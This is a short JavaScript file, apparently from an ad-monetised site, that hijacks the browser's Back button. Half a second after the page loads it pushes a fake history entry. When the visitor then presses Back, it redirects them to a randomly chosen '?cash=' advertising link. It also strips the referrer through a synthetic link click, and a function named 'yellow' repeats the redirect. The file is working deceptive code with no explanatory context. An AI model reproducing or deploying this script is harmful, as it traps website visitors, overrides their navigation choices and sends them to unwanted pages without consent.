var globalLink = new Array();
var apidomain = '//' + location.hostname + '/';
// 广告
globalLink.push(apidomain + '?cash=qysq');
globalLink.push(apidomain + '?cash=tsyj');
globalLink.push(apidomain + '?cash=xwfkys');
globalLink.push(apidomain + '?cash=yysx');
globalLink.push(apidomain + '?cash=zrl');
globalLink.push(apidomain + '?cash=nkgg');

function hh() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}
window.onload = function(){
    setTimeout('hh();', 500);
};

// 后退
$(window).on('popstate', function(e){
    jump(globalLink[Math.floor(globalLink.length * Math.random())]);
});

// url跳转
function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function yellow() {
    jump(globalLink[Math.floor(globalLink.length * Math.random())]);
}
